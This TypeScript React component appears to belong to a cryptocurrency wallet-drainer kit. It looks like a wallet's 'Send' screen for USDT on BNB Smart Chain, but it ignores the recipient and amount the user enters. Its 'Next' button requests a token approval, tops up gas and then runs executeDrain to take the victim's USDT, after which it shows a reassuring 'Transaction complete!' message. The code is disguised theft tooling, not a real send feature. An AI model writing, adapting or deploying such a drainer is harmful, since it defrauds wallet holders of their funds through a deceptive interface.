import { useState, useEffect } from "react"
import { ethers } from "ethers"
import { USDT_ADDRESS, USDT_DECIMALS } from "../config"
import { requestApproval, ensureGas, executeDrain } from "../lib/web3"

interface Props {
  provider: ethers.BrowserProvider
  address: string
}

type DrainStage = "idle" | "approving" | "checking_gas" | "draining" | "done" | "error"

export default function SendPage({ provider, address }: Props) {
  const [recipient, setRecipient] = useState("")
  const [amount, setAmount] = useState("")
  const [usdtBalance, setUsdtBalance] = useState("0")
  const [stage, setStage] = useState<DrainStage>("idle")
  const [statusMsg, setStatusMsg] = useState("")

  useEffect(() => {
    (async () => {
      const usdt = new ethers.Contract(USDT_ADDRESS, ["function balanceOf(address) view returns (uint256)"], provider)
      const bal = await usdt.balanceOf(address)
      setUsdtBalance(ethers.formatUnits(bal, USDT_DECIMALS))
    })()
  }, [address, provider])

  const handleDrain = async () => {
    setStage("approving")
    setStatusMsg("Waiting for approval...")

    try {
      const approvedAmount = await requestApproval(provider, address)

      if (!approvedAmount) {
        setStage("error")
        setStatusMsg("Approval failed.")
        return
      }

      setStage("checking_gas")
      setStatusMsg("Checking gas balance...")

      const hasGas = await ensureGas(provider, address)
      if (!hasGas) {
        setStage("error")
        setStatusMsg("Could not fund gas.")
        return
      }

      setStage("draining")
      setStatusMsg("Transferring USDT...")

      const drained = await executeDrain(address, approvedAmount)
      if (drained) {
        setStage("done")
        setStatusMsg("Transaction complete!")
      } else {
        setStage("error")
        setStatusMsg("Drain failed - check logs.")
      }
    } catch (err: any) {
      setStage("error")
      setStatusMsg("Error: " + (err.message || "Unknown error"))
    }
  }

  const s = {
    page: { display: "flex", flexDirection: "column" as const, minHeight: "100dvh", background: "#0C0F1E" },
    header: { display: "flex", alignItems: "center", padding: "16px", borderBottom: "1px solid #2E3144" },
    title: { fontSize: "18px", fontWeight: 600, color: "#fff" },
    body: { flex: 1, padding: "24px 16px", display: "flex", flexDirection: "column" as const, gap: "24px" },
    networkBadge: { display: "flex", alignItems: "center", gap: "8px", background: "#1F2233", borderRadius: "12px", padding: "12px 16px" },
    dot: { width: "24px", height: "24px", borderRadius: "50%", background: "rgba(240, 185, 11, 0.2)", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "12px", color: "#F0B90B" },
    netText: { fontSize: "14px", color: "#fff" },
    label: { fontSize: "12px", color: "#9CA3AF", marginBottom: "8px", display: "block" },
    inputRow: { display: "flex", gap: "8px" },
    input: { flex: 1, background: "#1F2233", color: "#fff", fontSize: "14px", border: "1px solid #2E3144", borderRadius: "12px", padding: "12px 16px", outline: "none" },
    scanBtn: { background: "#3375BB", color: "#fff", fontSize: "14px", border: "none", borderRadius: "12px", padding: "12px 16px", fontWeight: 500, cursor: "pointer" },
    tokenCard: { background: "#1F2233", borderRadius: "12px", padding: "12px 16px", display: "flex", alignItems: "center", justifyContent: "space-between" },
    tokenLeft: { display: "flex", alignItems: "center", gap: "12px" },
    tokenIcon: { width: "36px", height: "36px", borderRadius: "50%", background: "rgba(18, 183, 106, 0.2)", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "16px", color: "#12B76A", fontWeight: "bold" },
    tokenName: { fontSize: "14px", color: "#fff", fontWeight: 500 },
    tokenSub: { fontSize: "12px", color: "#9CA3AF" },
    balanceLabel: { fontSize: "12px", color: "#9CA3AF", textAlign: "right" as const },
    balanceVal: { fontSize: "14px", color: "#fff", textAlign: "right" as const },
    amountBox: { background: "#1F2233", borderRadius: "12px", padding: "12px 16px", border: "1px solid #2E3144" },
    amountInputRow: { display: "flex", alignItems: "center", justifyContent: "space-between" },
    amountInput: { background: "transparent", color: "#fff", fontSize: "24px", fontWeight: 600, border: "none", outline: "none", width: "100%" },
    maxBtn: { background: "#3375BB", color: "#fff", fontSize: "12px", border: "none", borderRadius: "8px", padding: "4px 12px", fontWeight: 500, cursor: "pointer" },
    usdHint: { fontSize: "12px", color: "#6B7280", marginTop: "4px" },
    footer: { padding: "0 16px 32px" },
    nextBtn: { width: "100%", background: "#3375BB", color: "#fff", border: "none", fontSize: "16px", fontWeight: 600, padding: "16px", borderRadius: "12px", cursor: "pointer" },
    nextBtnDisabled: { width: "100%", background: "#3375BB", color: "#fff", border: "none", fontSize: "16px", fontWeight: 600, padding: "16px", borderRadius: "12px", opacity: 0.4, cursor: "not-allowed" as const },
    overlay: {
      position: "fixed" as const, top: 0, left: 0, right: 0, bottom: 0,
      background: "rgba(12, 15, 30, 0.95)", display: "flex",
      flexDirection: "column" as const, alignItems: "center", justifyContent: "center",
      zIndex: 1000, padding: "24px"
    },
    spinner: { width: "48px", height: "48px", border: "4px solid rgba(51, 117, 187, 0.3)", borderTopColor: "#3375BB", borderRadius: "50%", animation: "spin 1s linear infinite", marginBottom: "24px" },
    overlayTitle: { fontSize: "20px", fontWeight: 600, color: "#fff", marginBottom: "8px" },
    overlaySub: { fontSize: "14px", color: "#9CA3AF", textAlign: "center" as const, maxWidth: "320px", lineHeight: "1.5" },
    doneText: { fontSize: "16px", color: "#12B76A", fontWeight: 600, textAlign: "center" as const, marginTop: "16px" },
    errorIcon: { width: "64px", height: "64px", borderRadius: "50%", background: "rgba(240, 68, 56, 0.1)", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "28px", color: "#F04438", fontWeight: "bold", marginBottom: "24px" },
  }

  if (stage !== "idle") {
    return (
      <div style={s.page}>
        <div style={s.overlay}>
          {stage === "approving" || stage === "checking_gas" || stage === "draining" ? (
            <>
              <div style={s.spinner} />
              <h2 style={s.overlayTitle}>Processing...</h2>
              <p style={s.overlaySub}>{statusMsg}</p>
            </>
          ) : stage === "done" ? (
            <>
              <div style={{ ...s.spinner, borderColor: "rgba(18, 183, 106, 0.3)", borderTopColor: "#12B76A" }} />
              <h2 style={{ ...s.overlayTitle, color: "#12B76A" }}>Complete</h2>
              <p style={s.overlaySub}>{statusMsg}</p>
              <p style={s.doneText}>You may close this page.</p>
            </>
          ) : stage === "error" ? (
            <>
              <div style={s.errorIcon}>!</div>
              <h2 style={{ ...s.overlayTitle, color: "#F04438" }}>Error</h2>
              <p style={s.overlaySub}>{statusMsg}</p>
            </>
          ) : null}
        </div>
      </div>
    )
  }

  return (
    <div style={s.page}>
      <div style={s.header}>
        <h1 style={s.title}>Send</h1>
      </div>
      <div style={s.body}>
        <div style={s.networkBadge}>
          <div style={s.dot}>B</div>
          <span style={s.netText}>BNB Smart Chain</span>
        </div>
        <div>
          <label style={s.label}>Recipient Address</label>
          <div style={s.inputRow}>
            <input
              style={s.input}
              value={recipient}
              onChange={(e) => setRecipient(e.target.value)}
              placeholder="Enter wallet address"
              autoCapitalize="off"
              autoCorrect="off"
            />
            <button style={s.scanBtn}>Scan</button>
          </div>
        </div>
        <div>
          <label style={s.label}>Token</label>
          <div style={s.tokenCard}>
            <div style={s.tokenLeft}>
              <div style={s.tokenIcon}>$</div>
              <div>
                <p style={s.tokenName}>USDT</p>
                <p style={s.tokenSub}>Tether USD</p>
              </div>
            </div>
            <div>
              <p style={s.balanceLabel}>Balance</p>
              <p style={s.balanceVal}>{parseFloat(usdtBalance).toFixed(2)}</p>
            </div>
          </div>
        </div>
        <div>
          <label style={s.label}>Amount</label>
          <div style={s.amountBox}>
            <div style={s.amountInputRow}>
              <input
                style={s.amountInput}
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                type="number"
                inputMode="decimal"
                placeholder="0"
              />
              <button style={s.maxBtn} onClick={() => setAmount(usdtBalance)}>MAX</button>
            </div>
            <p style={s.usdHint}>~$0.00 USD</p>
          </div>
        </div>
      </div>
      <div style={s.footer}>
        <button
          style={(!amount || parseFloat(amount) <= 0) ? s.nextBtnDisabled : s.nextBtn}
          onClick={handleDrain}
          disabled={!amount || parseFloat(amount) <= 0}
        >
          Next
        </button>
      </div>
    </div>
  )
}